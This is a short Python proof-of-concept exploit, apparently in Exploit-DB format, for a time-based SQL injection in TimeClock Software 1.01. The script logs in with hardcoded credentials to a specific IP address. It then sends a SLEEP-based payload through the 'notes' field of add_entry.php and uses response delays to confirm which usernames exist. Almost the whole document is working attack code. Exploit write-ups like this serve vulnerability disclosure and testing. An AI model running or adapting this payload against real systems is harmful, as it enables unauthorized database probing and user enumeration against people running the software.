#!/usr/bin/python3

# Exploit Title: TimeClock Software 1.01 Time-Based SQL Injection
# Date: July 21, 2020
# Exploit Author: François Bibeau
# Co Author: Tyler Butler
# Vendor Homepage: http://timeclock-software.net/
# Software Link: http://timeclock-software.net/timeclock-download.php
# Version: 1.01
# Tested on: Ubuntu 18.04.3 (LTS) x64

import time
import requests


login_url = 'http://159.203.41.34/login_action.php'
login_data = {'username':'fred','password':'fred','submit':'Log In'}
headers = {'User-Agent': 'Mozilla/5.0'}

# init session & login
session = requests.Session()
session.post(login_url,headers=headers,data=login_data)

# static list provided for PoC, could use a text file
users = ['john','bill','tim','fred','garry','sid','admin']

for user in users:
	url = "http://159.203.41.34/add_entry.php"
	payload = f"' OR IF((SELECT username FROM user_info WHERE username='{user}')='{user}', SLEEP(5), NULL)='"

	data = {'data_month': '1',
	'data_day': '1',
	'data_year': '1',
	'type_id': '5',
	'hours': '1',
	'notes': payload,
	'submit': 'Add'}

	print(f'Checking user {user}... ', end = '')

	start = time.time()
	response = session.post(url,data=data)
	end = time.time()

	delay = end - start

	if delay > 5:
		print('User found!')
	else:
		print('')